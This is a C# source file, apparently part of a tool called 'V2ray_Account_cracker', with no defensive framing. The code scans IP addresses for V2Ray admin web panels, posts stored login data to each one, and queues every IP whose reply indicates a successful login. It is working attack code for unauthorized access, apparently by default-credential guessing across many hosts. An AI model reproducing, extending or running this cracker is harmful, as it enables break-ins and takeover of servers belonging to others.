using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Leaf.xNet;

namespace V2ray_Account_cracker
{
    internal class Methods
    {
        public static void config(string IP)
        {
            if(isServer(IP))
            {
                if(logIn(IP))
                {
                    Form1.hit.Enqueue(IP);
                }
            }
        }
        private static bool isServer(string ip)
        {
            HttpClient client = new HttpClient();
            try
            {
                if(client.GetStringAsync("http://" + ip + $"/{Constants.PORT}").Result.ToString().Contains("<h1>"))
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
        }
        private static bool logIn(string ip)
        {
            string host = "http://" + ip + $"/{Constants.PORT}";
            try
            {
                HttpRequest login = new HttpRequest();
                login.IgnoreProtocolErrors = true;
                login.KeepAlive = true;
                login.AddHeader(HttpHeader.Accept, "application/json, text/plain, */*");
                login.AddHeader(HttpHeader.AcceptLanguage, "en-IR,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,fa;q=0.6,ar;q=0.5");
                login.AddHeader(HttpHeader.Origin,host);
                login.Referer = host;
                login.UserAgent = "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 106.0) Gecko / 20100101 Firefox / 106.0";
                login.AllowAutoRedirect = true;
                string res = login.Post(host, Constants.DATA, "application/json; charset=utf-8").ToString();
                if (res.Contains("CPU"))
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}
